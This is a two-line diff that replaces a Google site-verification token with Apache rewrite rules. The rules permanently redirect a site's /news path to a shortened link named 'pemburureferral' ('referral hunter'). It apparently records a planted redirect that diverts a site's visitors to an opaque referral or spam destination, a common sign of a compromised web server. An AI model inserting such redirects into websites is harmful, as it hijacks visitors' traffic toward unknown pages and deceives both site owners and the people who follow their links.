@@ -1,1 +1,2 @@
-google-site-verification: google61dc59333990536b.html
+RewriteEngine On
+RewriteRule ^news/?$ https://t.ly/pemburureferral/ [R=301,L]
